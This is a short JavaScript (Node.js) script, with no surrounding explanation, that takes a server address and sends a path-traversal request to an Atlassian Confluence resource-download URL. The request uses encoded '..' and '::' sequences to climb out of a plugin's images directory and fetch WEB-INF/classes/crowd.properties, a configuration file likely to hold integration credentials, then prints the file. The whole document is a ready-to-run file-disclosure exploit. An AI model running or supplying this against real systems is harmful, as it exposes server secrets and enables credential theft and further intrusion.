const base = process.argv[2].replace(/\/$/, '');
const path = '/s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3a%2e%2e%3a%3aWEB-INF%3a%3aclasses%3a%3acrowd.properties';
fetch(base + path).then(response => response.text()).then(console.log);
